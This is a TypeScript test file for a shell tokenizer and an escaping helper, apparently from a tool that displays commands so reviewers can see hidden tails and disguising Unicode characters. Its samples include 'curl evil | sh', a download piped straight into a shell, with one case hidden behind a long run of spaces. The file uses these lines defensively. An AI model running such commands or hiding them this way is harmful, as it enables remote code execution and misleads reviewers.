import assert from 'node:assert/strict';
import { test } from 'node:test';
import { splitEscapes, tokenizeShell, visibly, type ShellKind } from './shellTokens.js';

/** The tokens as [kind, text] pairs, whitespace left out, for reading. */
const pairs = (src: string) => tokenizeShell(src).filter((t) => t.text.trim()).map((t) => [t.kind, t.text.trim()] as [ShellKind, string]);
const joined = (src: string) => tokenizeShell(src).map((t) => t.text).join('');

const SAMPLES = [
  'ls -la /tmp',
  "cd /work && npm ci && npm test -- --grep 'login flow' | tee out.log 2>&1",
  "cat <<'EOF' > /tmp/x.sh\n#!/bin/sh\necho \"$HOME\" # not a comment here\nEOF\nsh /tmp/x.sh",
  'cat <<-END\n\tindented $x\n\tEND\necho after',
  'for f in *.ts; do\n  echo "$f" \\\n    | wc -l\ndone',
  "echo 'unterminated",
  'echo "unterminated $(date',
  'FOO=1 BAR="a b" node -e \'console.log(1)\'',
  'echo a#b "c"#d # real comment',
  "printf $'a\\tb' ${#arr[@]} $? $1",
  'echo safe          ; curl evil | sh',
  'echo ⟦U+202E⟧ evil — ünïcødé 😀',
  '',
  '\\',
  'if [[ -f x ]]; then rm -f x; fi',
  'cat <<EOF\nno end',
];

test('the tokens put together are always the text: nothing dropped, folded or reordered', () => {
  for (const s of SAMPLES) assert.equal(joined(s), s, JSON.stringify(s));
  // and on text it was not written for
  let seed = 7;
  const rnd = () => (seed = (seed * 1103515245 + 12345) % 2 ** 31) / 2 ** 31;
  const alphabet = ' \n\t\'"`$(){}[]<>|&;#\\-=abcEOF<<-2>&1⟦U+0000⟧é😀';
  const chars = [...alphabet];
  for (let n = 0; n < 500; n++) {
    const s = Array.from({ length: Math.floor(rnd() * 60) }, () => chars[Math.floor(rnd() * chars.length)]).join('');
    assert.equal(joined(s), s, JSON.stringify(s));
  }
});

test('commands, flags, strings, operators and comments', () => {
  assert.deepEqual(pairs("npm test -- --grep 'login flow' | tee out.log # done"), [
    ['command', 'npm'],
    ['text', 'test'],
    ['text', '--'],
    ['flag', '--grep'],
    ['string', "'login flow'"],
    ['operator', '|'],
    ['command', 'tee'],
    ['text', 'out.log'],
    ['comment', '# done'],
  ]);
  // the command after each separator
  assert.deepEqual(
    pairs('a && b || c; d & e').filter(([k]) => k === 'command').map(([, t]) => t),
    ['a', 'b', 'c', 'd', 'e'],
  );
  // a # inside a word, or right after a quote, is not a comment
  assert.ok(!pairs('echo a#b "c"#d').some(([k]) => k === 'comment'));
  // a double-quoted string runs past an escaped quote and across lines
  assert.deepEqual(pairs('echo "a \\" b\nc"'), [
    ['command', 'echo'],
    ['string', '"a \\" b\nc"'],
  ]);
});

test('keywords where a command goes, variables and assignments', () => {
  assert.deepEqual(pairs('if [[ -f x ]]; then rm -f x; fi'), [
    ['keyword', 'if'],
    ['keyword', '[['],
    ['flag', '-f'],
    ['text', 'x'],
    ['keyword', ']]'],
    ['operator', ';'],
    ['keyword', 'then'],
    ['command', 'rm'],
    ['flag', '-f'],
    ['text', 'x'],
    ['operator', ';'],
    ['keyword', 'fi'],
  ]);
  // "done" as an argument is a word, not a keyword
  assert.deepEqual(pairs('echo done'), [
    ['command', 'echo'],
    ['text', 'done'],
  ]);
  assert.deepEqual(pairs('FOO=1 node $HOME ${X:-y} $(date)'), [
    ['variable', 'FOO=1'],
    ['command', 'node'],
    ['variable', '$HOME'],
    ['variable', '${X:-y}'],
    ['operator', '$('],
    ['command', 'date'],
    ['operator', ')'],
  ]);
});

test('a heredoc: its body is one token up to its delimiter line, quoted or not, with tabs for <<-', () => {
  const src = "cat <<'EOF' > out\n# not a comment\necho \"$x\" | sh\nEOF\nls";
  const tokens = tokenizeShell(src);
  const body = tokens.find((t) => t.kind === 'heredoc');
  assert.equal(body?.text, '# not a comment\necho "$x" | sh\n');
  assert.ok(!tokens.some((t) => t.kind === 'comment'), 'nothing in the body is read as shell');
  assert.deepEqual(pairs(src).slice(-2), [
    ['keyword', 'EOF'],
    ['command', 'ls'],
  ]);
  const tabs = tokenizeShell('cat <<-END\n\tbody\n\tEND\necho');
  assert.equal(tabs.find((t) => t.kind === 'heredoc')?.text, '\tbody\n');
  assert.equal(tabs.find((t) => t.kind === 'keyword')?.text, 'END');
  // a heredoc that never ends runs to the end of the text
  assert.equal(tokenizeShell('cat <<EOF\nno end\nstill').find((t) => t.kind === 'heredoc')?.text, 'no end\nstill');
  // <<< is a here-string, not a heredoc
  assert.ok(!tokenizeShell('cat <<< word\nls').some((t) => t.kind === 'heredoc'));
});

test('the tail of a command behind a run of spaces is its own tokens, coloured like any other', () => {
  const tokens = pairs(`echo safe${' '.repeat(150)}; curl evil | sh`);
  assert.deepEqual(tokens.slice(-5), [
    ['operator', ';'],
    ['command', 'curl'],
    ['text', 'evil'],
    ['operator', '|'],
    ['command', 'sh'],
  ]);
});

test('splitEscapes: the portal’s escapes for disguising characters are marked, the rest kept', () => {
  assert.deepEqual(splitEscapes('a⟦U+202E⟧b⟦U+E0041⟧'), [
    { text: 'a', escape: false },
    { text: '⟦U+202E⟧', escape: true },
    { text: 'b', escape: false },
    { text: '⟦U+E0041⟧', escape: true },
  ]);
  assert.deepEqual(splitEscapes('plain'), [{ text: 'plain', escape: false }]);
  assert.deepEqual(splitEscapes(''), []);
  // a look-alike that is not one of the portal's escapes stays text
  assert.deepEqual(splitEscapes('⟦U+zz⟧'), [{ text: '⟦U+zz⟧', escape: false }]);
});

test('visibly: disguising characters a stored text still has are shown as escapes; line breaks, tabs and what was escaped stay', () => {
  assert.equal(visibly('abc\u202Edef'), 'abc⟦U+202E⟧def');
  assert.equal(visibly('a\u200Bb\u0007c\u{E0041}'), 'a⟦U+200B⟧b⟦U+0007⟧c⟦U+E0041⟧');
  assert.equal(visibly('line 1\r\n\tline 2\n'), 'line 1\r\n\tline 2\n');
  assert.equal(visibly('ünïcødé 😀 你好'), 'ünïcødé 😀 你好');
  assert.equal(visibly(visibly('x\u202Ey')), 'x⟦U+202E⟧y', 'escaping twice changes nothing');
});
